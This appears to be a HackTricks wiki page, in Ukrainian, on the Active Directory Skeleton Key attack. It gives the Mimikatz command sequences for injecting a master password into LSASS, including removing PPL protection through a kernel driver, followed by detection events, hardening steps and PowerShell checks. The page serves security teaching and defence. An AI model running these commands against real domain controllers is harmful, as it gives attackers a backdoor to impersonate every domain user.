# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

**Skeleton Key attack** — це техніка, яка дає змогу зловмисникам **обійти автентифікацію Active Directory**, **впровадивши master password** у процес LSASS кожного контролера домену. Після впровадження master password (за замовчуванням **`mimikatz`**) можна використовувати для автентифікації як **будь-який користувач домену**, тоді як їхні реальні паролі продовжують працювати.<sup>[[1]](#references)[[2]](#references)</sup>

Ключові факти:

- Потрібні **Domain Admin/SYSTEM + SeDebugPrivilege** на кожному DC; після кожного перезавантаження атаку потрібно **застосовувати повторно**.<sup>[[2]](#references)</sup>
- Класична реалізація Mimikatz змінює шляхи перевірки **NTLM** і **Kerberos RC4 (etype 0x17)**; автентифікація лише через AES **не приймає цей skeleton password через RC4 hook**.<sup>[[2]](#references)</sup>
- Може конфліктувати зі сторонніми LSA authentication packages або додатковими провайдерами smart-card / MFA.<sup>[[2]](#references)</sup>
- Модуль Mimikatz приймає необов’язковий switch `/letaes`, щоб не змінювати Kerberos/AES hooks у разі проблем із сумісністю.<sup>[[3]](#references)</sup>

### Execution

Classic, non‑PPL protected LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Якщо **LSASS працює як protected process light (PPL)**, доступ до налагодження з user-mode заблоковано. Наведена нижче історична процедура Mimikatz завантажує його kernel driver і видаляє захист перед patching LSASS. Credential Guard є окремим механізмом ізоляції, і його не слід використовувати як синонім PPL.<sup>[[3]](#references)[[4]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Після injection автентифікуйтеся за допомогою будь-якого доменного облікового запису, але використовуйте пароль `mimikatz` (або значення, задане оператором). У середовищах із кількома DC не забудьте повторити це на **всіх DC**.

## Mitigations

- **Моніторинг журналів**
- Системна подія **Event ID 7045** (інсталяція служби/драйвера) для непідписаних драйверів, таких як `mimidrv.sys`.
- **Sysmon**: Event ID 7 (завантаження драйвера) для `mimidrv.sys`; Event ID 10 для підозрілого доступу до `lsass.exe` з боку процесів, які не є системними.
- Події безпеки **Event ID 4673/4611** для аномалій використання конфіденційних привілеїв або реєстрації пакетів автентифікації LSA; зіставляйте їх із неочікуваними входами 4624 із використанням RC4 (etype 0x17) від DC.
- **Зміцнення LSASS**
- За можливості тримайте **RunAsPPL** і **Credential Guard** увімкненими. Вони забезпечують різні рівні захисту, а разом підвищують вартість і обсяг телеметрії спроб модифікувати або видобути секрети LSASS.<sup>[[4]](#references)</sup>
- За можливості вимкніть legacy **RC4**; Kerberos tickets, обмежені AES, унеможливлюють RC4 hook path, який використовує skeleton key.<sup>[[2]](#references)</sup>
- Швидкі перевірки за допомогою PowerShell:
- Виявлення інсталяцій непідписаних kernel driver: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Пошук драйвера Mimikatz: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Перевірка застосування PPL після перезавантаження: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Додаткові рекомендації щодо зміцнення захисту облікових даних див. у матеріалі [захист облікових даних Windows](../stealing-credentials/credentials-protections.md).

## References

- [1] [Netwrix – атака Skeleton Key в Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – модуль Mimikatz misc::skeleton](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
- [4] [Microsoft Learn — налаштування додаткового захисту LSA](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
